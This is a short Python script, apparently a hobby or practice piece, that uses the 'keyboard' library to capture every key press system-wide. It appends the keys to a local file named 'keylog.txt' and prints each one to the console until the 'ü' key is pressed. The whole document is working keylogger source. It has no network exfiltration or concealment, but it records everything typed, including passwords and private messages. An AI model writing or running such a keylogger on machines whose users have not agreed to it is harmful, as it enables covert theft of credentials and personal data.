import keyboard
f = open("keylog.txt", "a")
while True:
    event = keyboard.read_event()
    if event.name == 'ü' and event.event_type == 'down':
        print("exit key (ü) was pressed.")
        f.close()
        break
    elif event.name == 'enter':
        meow = f"{event.name}"
        print(meow)
        f.write("\n")
    elif event.name == 'space':
        meow = f"{event.name}"
        print(meow)
        f.write(" ")
    elif event.name == 'backspace':
        meow = f"{event.name}"
        print(meow)
        f.write(" ")
    elif event.event_type == 'down':
        meow = f"{event.name}"
        print(meow)
        f.write(meow)